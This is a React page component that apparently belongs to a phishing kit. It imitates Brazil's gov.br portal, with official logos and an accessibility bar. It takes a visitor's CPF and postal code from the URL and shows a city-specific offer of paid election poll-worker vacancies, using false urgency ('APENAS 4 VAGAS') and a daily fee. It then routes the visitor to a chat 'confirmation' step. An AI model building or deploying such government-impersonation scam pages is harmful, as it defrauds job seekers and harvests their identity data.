import { useState, useEffect } from "react";
import { useLocation } from "wouter";

export default function Vagas() {
  const [, setLocation] = useLocation();
  const [cidade, setCidade] = useState("");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const cepParam = params.get("cep");
    const cpfParam = params.get("cpf");

    if (!cepParam || !cpfParam) {
      setLocation("/");
      return;
    }

    fetchCEPData(cepParam);
  }, []);

  const fetchCEPData = async (cep: string) => {
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await response.json();

      if (data.erro) {
        setCidade("Localização não identificada");
      } else {
        setCidade(`${data.localidade} - ${data.uf}`);
      }
      setLoading(false);
    } catch (err) {
      setCidade("Localização não identificada");
      setLoading(false);
    }
  };

  const handlePreencherVaga = () => {
    setLocation("/pre-confirmacao");
  };

  if (loading) {
    return (
      <>
        <header>
          <a href="#">
            <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
          </a>
        </header>
        <div className="container">
          <main id="main-signin">
            <div className="card">
              <h3>Carregando informações...</h3>
            </div>
          </main>
        </div>
      </>
    );
  }

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <h3 style={{ color: "#008C32" }}>✓ Vagas Disponíveis!</h3>
            <p>
              Ótima notícia! Encontramos vagas disponíveis para sua região:{" "}
              <strong>{cidade}</strong>
            </p>

            <div
              style={{
                backgroundColor: "#f8f9fa",
                padding: "20px",
                borderRadius: "8px",
                marginTop: "20px",
                marginBottom: "20px",
                border: "2px solid #008C32",
              }}
            >
              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  marginBottom: "10px",
                }}
              >
                <h4 style={{ margin: 0, color: "#008C32" }}>
                  Função: MESÁRIO 2
                </h4>
                <span
                  style={{
                    backgroundColor: "#ff6b6b",
                    color: "white",
                    padding: "5px 10px",
                    borderRadius: "5px",
                    fontSize: "12px",
                    fontWeight: "bold",
                  }}
                >
                  APENAS 4 VAGAS
                </span>
              </div>

              <p style={{ marginTop: "15px", marginBottom: "10px" }}>
                <strong>Atribuições da função:</strong>
              </p>
              <ul style={{ paddingLeft: "20px", lineHeight: "1.8" }}>
                <li>
                  Auxiliar na identificação dos eleitores e conferir documentos
                </li>
                <li>
                  Orientar os eleitores sobre o processo de votação na urna
                  eletrônica
                </li>
                <li>
                  Auxiliar na organização da fila e manter a ordem na seção
                  eleitoral
                </li>
                <li>
                  Registrar ocorrências e auxiliar no preenchimento de atas
                </li>
                <li>
                  Apoiar o Presidente da Mesa em todas as atividades necessárias
                </li>
              </ul>

              <div
                style={{
                  backgroundColor: "#e8f5e9",
                  padding: "15px",
                  borderRadius: "5px",
                  marginTop: "15px",
                }}
              >
                <p style={{ margin: 0, fontSize: "14px" }}>
                  <strong>Remuneração:</strong> R$ 347,80 por dia de trabalho
                  <br />
                  <strong>Carga horária:</strong> Das 7h às 18h (com intervalo)
                  <br />
                  <strong>Data prevista:</strong> 01/03/2026 (final de semana)
                  <br />
                  <strong>Benefício:</strong> Atestado fornecido para ausência no trabalho
                </p>
              </div>
            </div>

            <div className="button-panel">
              <button
                className="button-continuar"
                onClick={handlePreencherVaga}
                style={{
                  backgroundColor: "#008C32",
                  fontSize: "16px",
                  fontWeight: "bold",
                }}
              >
                Preencher Vaga
              </button>
            </div>

            <p
              style={{
                marginTop: "20px",
                fontSize: "13px",
                color: "#666",
                textAlign: "center",
              }}
            >
              Ao clicar em "Preencher Vaga", você será direcionado para a última
              etapa de confirmação via chat, onde validaremos sua zona eleitoral
              e as datas disponíveis.
            </p>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
